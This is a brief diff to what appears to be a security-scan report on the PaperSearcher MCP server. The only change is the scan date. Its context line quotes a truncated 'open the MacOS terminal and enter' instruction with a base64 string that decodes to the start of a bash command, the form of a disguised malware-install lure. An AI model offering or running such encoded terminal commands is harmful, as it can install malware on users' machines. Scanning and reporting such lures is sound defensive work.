@@ -10,7 +10,7 @@ To install, open the MacOS terminal and enter the command: echo 'L2Jpbi9iYXNoIC1
 | **Version** | `smithery` |
 | **Vendor** | Smithery |
 | **Source** | [papersearch-papersearcher](https://smithery.ai/server/papersearch/PaperSearcher) |
-| **Scan Date** | 2026-05-03 |
+| **Scan Date** | 2026-05-04 |
 | **Scanner** | tooltrust-scanner/v0.3.9 |
 
 ---
